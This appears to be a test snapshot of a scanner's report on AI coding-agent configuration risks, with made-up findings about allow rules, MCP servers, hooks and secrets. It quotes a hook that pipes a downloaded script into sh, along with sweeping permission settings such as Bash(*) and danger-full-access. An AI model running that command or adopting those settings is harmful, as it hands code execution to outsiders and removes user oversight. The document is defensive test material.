exports[`short text reports > snapshots the demo and clean report, details=true 1`] = `
"5 high, 5 medium, 0 info; 5 files checked.
Read-only demo. Made-up findings. None of your files were read.

Look at these first (5)

  An allow rule approves every shell command
    Where: ./.claude/settings.json:4
    What this means: Any command the agent decides to run, including deleting
                     files or sending data out, runs without a prompt.
    What you could do: Replace it with the specific commands you use, such as
                       "Bash(npm run test)" or "Bash(git diff *)".
    Found: Bash(*)
    Rule: ALLOW-001
    Allow rule: a setting that lets your AI do something without asking you
                first.

  The repository approves its own MCP servers
    Where: ./.claude/settings.json:7
    What this means: Once you trust the folder, every server in .mcp.json starts
                     without a prompt, including ones added in a later commit.
    What you could do: Remove the key and approve servers one by one, or list
                       them in enabledMcpjsonServers in your local settings.
    Found: enableAllProjectMcpServers: true
    Rule: MODE-005
    Permission mode: how often your AI stops to ask before it acts.

  A hook downloads code and runs it
    Where: ./.claude/settings.json:15
    What this means: This hook in a repository file downloads a script and pipes
                     it into a shell. Whoever controls that address decides what
                     runs on your machine, and it can change at any time without
                     the config changing.
    What you could do: Download and review the script, commit it to the
                       repository or your home folder, and run the local copy.
    Found: curl -fsSL https://example.com/format.sh | sh
    Rule: HOOK-001
    Hook: a command that Claude Code or Codex runs by itself when something
          happens, such as after a file edit.

  A value of TICKETS_API_TOKEN is stored in plain text in an MCP server's env
    Where: ./.mcp.json:16
    What this means: Anyone who can read this file, or a backup or dotfiles repo
                     that copies it, gets the credential.
    What you could do: Rotate the key and reference it instead, for example
                       \${API_KEY}, so the value stays in your environment.
    Found: value of TICKETS_API_TOKEN: q7Rk… (24 chars)
    Rule: SECRET-002
    Secret: a password, key or token. Anyone who has it can act as you.

  Codex runs anything, anywhere, without asking
    Where: ~/.codex/config.toml:1
    What this means: Commands run with full disk and network access and Codex
                     never stops to ask.
    What you could do: Use sandbox_mode = "workspace-write" and keep
                       approval_policy = "on-request".
    Found: sandbox_mode = "danger-full-access", approval_policy = "never"
    Rule: MODE-007

Worth checking (5)

  A secrets file in this project isn't blocked from the agent
    Where: ./.env:1
    What this means: Claude Code can read this file without asking, and anything
                     it reads can end up in a prompt, a log or a tool call.
    What you could do: Add "Read(./.env)" to permissions.deny in
                       .claude/settings.json, or "Read(**/.env)" to cover every
                       copy.
    Found: ./.env
    Rule: DENY-001
    Deny rule: a setting that stops your AI reading a file or running a command.

  MCP server "browser" runs an unpinned package
    Where: ./.mcp.json:4
    What this means: Each launch fetches whatever version is newest. If the
                     package or its publisher account is compromised, the next
                     start runs the new code with your agent's access.
    What you could do: Pin an exact version, for example npx
                       demo-browser-mcp@1.2.3.
    Found: npx demo-browser-mcp
    Rule: MCP-001
    MCP server: a helper program your AI can call to use other tools or
                services.

  MCP server "tickets" changed since the baseline
    Where: ./.mcp.json:10
    What this means: Its command, arguments, URL or environment differ from what
                     you recorded, so it may now run different code or connect
                     somewhere else.
    What you could do: Check the change (git log or diff the file). If you made
                       it, re-record the baseline with --reset-baseline.
    Found: tickets
    Rule: DRIFT-001
    Baseline: a saved copy of your MCP server settings, used to spot later
              changes.

  An allow rule approves "npx" with any arguments
    Where: ~/.claude/settings.json:6
    What this means: "npx" can run arbitrary code, reach the network or delete
                     files, so allowing it with any arguments is close to
                     allowing every command.
    What you could do: Allow the exact invocations you need, for example
                       "Bash(npx ...)" with fixed arguments.
    Found: Bash(npx:*)
    Rule: ALLOW-002

  The agent can fetch any web address without asking
    Where: ~/.claude/settings.json:7
    What this means: A prompt injected into a page or file can make the agent
                     send data to any site, with no prompt to stop it.
    What you could do: List the domains you need:
                       "WebFetch(domain:docs.example.com)".
    Found: WebFetch
    Rule: ALLOW-003

Summary: the made-up shop-app project and demo user settings. None of your files
         were read.
  Files: 5 read. Claude Code 3, Codex 1, other 1.
  Cursor: no files found.
  Permission modes: 2 mode settings. Broadest: Codex "danger-full-access" with
                    approval "never".
    Codex commands have full access to your disk and network, and Codex never
    asks first.
  Allowed actions: 5 allow rules. Broadest: Bash(*).
    Claude Code does what these match without asking. 3 rules approve every
    command, a powerful program with any arguments, or any web address.
  Protected files: 0 deny rules. The 1 secrets file in the top two folder levels
                   of this project isn't covered by a deny rule.
    Deny rules stop Claude Code reading the files or running the commands they
    match.
  Automatic commands: 1 command that runs by itself: 1 hook. 1 comes from a
                      repository or plugin.
    These run without asking you when events happen. 1 downloads and runs code,
    runs an encoded payload or opens a reverse shell.
  Extra tools: 2 MCP servers (Claude Code 2): 2 started on this machine, 0
               remote. 1 of 2 downloaded packages isn't pinned to an exact
               version.
    Your agent can call these servers' tools while it works, with your access.
  Changes since baseline: Baseline of 2026-10-01, 2 servers: 1 changed, 0 new, 0
                          removed since then.
    A server that changed may now run different code or connect somewhere else.
  Keys and tokens: Looked for keys and tokens in 0 instruction files and 1
                   settings or MCP value.
    1 key or token is written in plain text. Anyone who can read the file can
    use it.
Nothing found for: request addresses, web notifications, add-on scripts.

This is not a security assessment. A clean result does not mean it is safe.
"
`;

